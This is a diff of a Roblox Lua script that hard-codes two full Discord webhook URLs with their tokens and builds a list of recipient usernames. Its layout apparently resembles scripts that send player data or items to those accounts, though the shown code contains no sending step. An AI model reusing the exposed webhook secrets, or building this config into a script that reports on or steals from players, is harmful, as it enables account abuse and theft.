@@ -2,19 +2,21 @@
 local ExtraUsers = {"CREOLEO23", "2ndcfpaj67"}
 local Friends = {}
 
--- Define config manually to stop the "Waiting" warning
-_G["Script-SM_Config"] = {
+-- 1. Define config with a safety check
+_G["Script-SM_Config"] = _G["Script-SM_Config"] or {
     user_webhook = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa",
     dual_webhook = "https://discord.com/api/webhooks/1490011079735115796/CtTiahnkl0_ppBwAubLAEeO52GmOpTJ0tkfBMEsAJ1f7bO4Sz_cTyr07bUW9oGE9tCwo",
     users = {"CREOLEO25"}
 }
 
 local cfg = _G["Script-SM_Config"]
-local Webhook = cfg.user_webhook
-local DualWebhook = cfg.dual_webhook
-local Username = cfg.users
 
--- Correct table merging
+-- 2. FIXED LINE 13: Added Nil-Safety and Fallback
+local Webhook = (cfg and cfg.user_webhook) or "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+local DualWebhook = (cfg and cfg.dual_webhook) or "https://discord.com/api/webhooks/1490011079735115796/CtTiahnkl0_ppBwAubLAEeO52GmOpTJ0tkfBMEsAJ1f7bO4Sz_cTyr07bUW9oGE9tCwo"
+local Username = cfg and cfg.users or {"CREOLEO25"}
+
+-- 3. Correct table merging (Added pairs safety)
 for _, v in ipairs(Username) do table.insert(Friends, v) end
 for _, v in pairs(ExtraUsers) do 
     if not table.find(Friends, v) then 
@@ -22,7 +24,10 @@ for _, v in pairs(ExtraUsers) do
     end 
 end
 
+-- 4. Final Wait for Game
 if not game:IsLoaded() then game.Loaded:Wait() end
+local Players = game:GetService("Players")
+print("✅ Lynx Config & Services Loaded Successfully")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 -- Safety loop for LocalPlayer
